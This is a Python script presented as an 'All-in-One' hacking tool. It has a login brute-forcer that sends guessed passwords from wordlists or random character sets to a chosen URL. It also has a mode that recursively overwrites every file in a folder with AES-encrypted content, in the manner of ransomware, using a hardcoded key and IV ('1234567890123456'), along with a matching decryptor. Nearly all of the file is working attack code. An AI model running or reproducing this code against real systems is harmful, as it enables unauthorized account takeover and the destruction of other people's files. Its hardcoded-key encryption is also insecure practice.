#----------AES imports----------
import glob
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import re
import os
import sys
from Crypto.Random import get_random_bytes


#-----------Brute Force imports-------
import requests
import random


'''
TODO:

1.sub domain brute force from a file.
2. nmap
3.AES sub folders encrypt


'''



class AllinOne:
    def HackTools(Elvo):

        print("Welcome to All-in-One-Elvo Tool")
        print('''
Choose Your Option From The List Below :)

    1.For Brute-Force enter Brute Force
    2.For AES encryption enter AES
 ''')
        User_Choice = input("And your choice would be?\n...: ").upper()
        print("You chose...: ", User_Choice.capitalize())

        # Test module!
        # if User_Choice == 'BRUTE FORCE':
        #     print("Nice")
        # elif User_Choice == 'AES':
        #     print("Nice")
        # else:
        #     print("Not an option :(")





        # -----------------------Brute Force-----------------------
        if User_Choice == 'BRUTE FORCE':


            BruteIntro = print('''How would you like to Brute Force?

    1.With a Worldlist [1]
    2.With Random Numbers[2]
    3.With Your Own Characters[3]
''')
            BruteChoice = input(str("And your choice would be?\n...: "))
            print("You chose...: ", BruteChoice)

            if BruteChoice == "1":


                url = input('Place the URL: ')
                username = input('Place the username: ')

                # chars =  "123"

                def send_request(username, passwd):
                    data = {
                        "username": username,
                        "password": passwd
                    }

                    r = requests.get(url, data=data)
                    return r

                def implist():
                    print('ADD .txt TO THE FILE!')
                    worldlist = input('Wordlist Path...: ')
                    file = open(worldlist, 'r')
                    tries = file.read().split('\n')
                    file.close()
                    return tries

                def main(tries):
                    for passwd in tries:
                        r = send_request(username, passwd)

                        if 'failed to login' in r.text.lower():
                            print(f"Incorrect {passwd}\n")
                        else:
                            print(f"Correct Password | {passwd} | !\n")
                            break

                tries = implist()
                main(tries)

            elif BruteChoice == "2":


                url = input('Place the URL: ')
                username = input('Place the username: ')
                chars = "abcdefghijklmnopqrstuvwxyz0123456789"

                def send_request(username, passwd):
                    data = {
                        "username": username,
                        "password": passwd
                    }

                    r = requests.get(url, data=data)
                    return r

                def main():
                    while True:
                        rndpasswd = random.choices(chars, k=2)
                        # k= is the password length.
                        passwd = "".join(rndpasswd)
                        # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                        r = send_request(username, passwd)

                        if 'failed to login' in r.text.lower():
                            print(f"Incorrect {passwd}\n")
                        else:
                            print(f"Correct Password | {passwd} | !\n")
                            break

                main()

            elif BruteChoice == "3":


                url = input('Place the URL: ')
                username = input('Place the username: ')
                chars = input('Write the characters to use')

                def send_request(username, passwd):
                    data = {
                        "username": username,
                        "password": passwd
                    }

                    r = requests.get(url, data=data)
                    return r

                def main():
                    while True:
                        rndpasswd = random.choices(chars, k=2)
                        # k= is the password length.
                        passwd = "".join(rndpasswd)
                        # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                        r = send_request(username, passwd)

                        if 'failed to login' in r.text.lower():
                            print(f"Incorrect {passwd}\n")
                        else:
                            print(f"Correct Password | {passwd} | !\n")
                            break

                main()

            else:
                print("That's not one of the options... start again\n")
                return object.HackTools('Elvo.a')
        # -----------------------Brute Force-----------------------



        # -----------------------AES-----------------------
        elif User_Choice == 'AES':
            AESQuestion = input("To Encrypt[1]\nTo Decrypt[2]\n...:")



            class AESCipher:
                def __init__(self, key):
                    # self.key = md5(key.encode('utf8')).digest() - creates randon key
                    self.key = b'1234567890123456'

                def encrypt(self, data):
                    # iv = get_random_bytes(AES.block_size) - creates random iv
                    iv = b'1234567890123456'
                    self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
                    return base64.b64encode(iv + self.cipher.encrypt(pad(data.encode('utf-8'),
                                                                         AES.block_size)))

                def decrypt(self, data):
                    raw = base64.b64decode(data)
                    self.cipher = AES.new(self.key, AES.MODE_CBC, raw[:AES.block_size])
                    return unpad(self.cipher.decrypt(raw[AES.block_size:]), AES.block_size)

            if AESQuestion == "1":

                folderpath = input('Place the Folder Path...: ')
                looptimes = int(input('Number of loops...:'))
                if looptimes == 0:
                    looptimes = 1

                counter = 1

                complete_files = []
                for root, dir_names, file_names in os.walk(folderpath):
                    for f in file_names:
                        complete_files.append(os.path.join(root, f))
# ------ NOTES --------
# subfolderpath = complete_files
# print("The complete set of files are ", complete_files)

# subfolderpathloop = (len(subfolderpath)) #count all the files inside folderpath
#
# for line in complete_files:
#     print(line) # prints each line of path

                for times in range(looptimes):
                    for file in complete_files:
                        fullpath = f'{file}'

                        msg = open(fullpath, 'r').read()
                        base64encoding = base64.b64encode(str(msg).encode('ascii'))
                        SHA256encoding = hashlib.sha256(str(msg).encode('UTF-8')).hexdigest()
                        print(f'\nFile Number...: {counter}\nLoop Time...: {times},{looptimes}\nFile Name...:{file}\nBase64...:{base64encoding}\nSHA256...: {SHA256encoding}')

                        encrykey = b'1234567890123456'
                        print('AES...:', AESCipher(encrykey).encrypt(msg).decode('UTF-8'))
                        print(f'\n-----next file-----')

                        with open(fullpath, 'w') as f:
                            f.write(AESCipher(encrykey).encrypt(msg).decode('UTF-8'))
                            f.close()
                            # print('File...: ' + str(counter))
                            counter += 1

            # Decrypt part
            #
            elif AESQuestion == "2":

                Question = input("Are you sure? Yes/No...: ").capitalize()

                if Question == 'Yes':
                    folderpath = input('Place the Folder Path...: ')
                    looptimes = int(input('Number of loops...:'))

                    if looptimes == 0:
                        looptimes = 1

                    counter = 1
                    # for times in range(looptimes):

                    # for dirpath, dirnames, filenames in os.walk(folderpath):
                    #     # whatever you want to do with these folders
                    #     print(dirpath, dirnames, filenames)

                    complete_files = []
                    for root, dir_names, file_names in os.walk(folderpath):
                        for f in file_names:
                            complete_files.append(os.path.join(root, f))
# ------ NOTES --------
# subfolderpath = complete_files
# print("The complete set of files are ", complete_files)

# subfolderpathloop = (len(subfolderpath)) #count all the files inside folderpath
#
# for line in complete_files:
#     print(line) # prints each line of path

                    for times in range(looptimes):
                        for file in complete_files:
                            fullpath = f'{file}'
                            msg = open(fullpath, 'r').read()

                            encrykey = b'1234567890123456'
                            print(f'\nFile Number...: {counter}\nLoop Time...: {times},{looptimes}\nFile Name...:{file}')
                            print('AES...:', AESCipher(encrykey).decrypt(msg).decode('UTF-8'))
                            print(f'\n-----next file-----')

                            with open(fullpath, 'w') as f:
                                f.write(AESCipher(encrykey).decrypt(msg).decode('UTF-8'))
                                f.close()
                                counter +=1

                elif Question == 'No':
                    print('As you wish')

            else:
                print("That's not one of the options... start again\n")
                return object.HackTools('Elvo.a')


        # -----------------------AES-----------------------
        else:
            print("\nNot an option :( , Try again...\n")
            return object.HackTools('Elvo.a')


object = AllinOne
object.HackTools('Elvo.a')
